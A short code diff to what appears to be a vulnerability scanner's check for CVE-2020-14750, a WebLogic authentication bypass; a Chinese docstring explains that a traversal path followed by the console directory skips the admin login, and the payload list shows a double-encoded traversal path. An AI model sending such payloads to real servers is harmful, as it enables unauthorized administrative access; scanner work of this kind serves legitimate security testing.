@@ -12,14 +12,14 @@ cve_2020_14750_payloads = [
     {'path': 'console/css/%252e%252e%252fconsole.portal'},
 ]
 
-def cve_2020_14750_scan(self, clients):
+def cve_2020_14750_scan(clients):
     ''' Weblogic 权限验证绕过漏洞
             可通过目录跳转符../回到上一级目录, 然后在../后面拼接console后台目录, 即可绕过后台登录, 直接进入后台
     '''
     client = clients.get('reqClient')
 
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'Weblogic',
         'vul_type': 'unAuthorized',
         'vul_id': 'CVE-2020-14750',
     }
